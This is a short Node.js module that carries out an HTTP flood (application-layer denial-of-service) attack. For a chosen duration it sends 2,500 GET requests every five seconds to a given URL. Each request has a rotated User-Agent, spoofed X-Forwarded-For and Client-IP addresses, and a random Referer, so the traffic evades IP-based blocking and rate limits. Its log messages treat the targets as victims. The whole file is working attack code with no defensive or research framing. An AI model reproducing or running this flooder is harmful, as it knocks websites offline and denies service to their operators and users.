const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "Referer": `https://${hostname}/` + Math.random().toString(36).substring(2),
    "Accept": "*/*",
    "Connection": "keep-alive"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname)
    };

    const req = client.request(options, res => {
      if (res.statusCode >= 200 && res.statusCode < 300) {
        console.log(`🌌 [${url.hostname}${options.path}] has been sent to the void`);
      } else {
        console.log(`🛡️ [${url.hostname}${options.path}] resisted with status ${res.statusCode}`);
      }

      res.on("data", () => {}); // optional
    });

    req.on("error", () => {
      console.log(`❌ [${url.hostname}${options.path}] failed to reach the void...`);
    });

    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 2500; i++) send();
    setTimeout(loop, 5000); // every 5 seconds
  }

  loop();
};
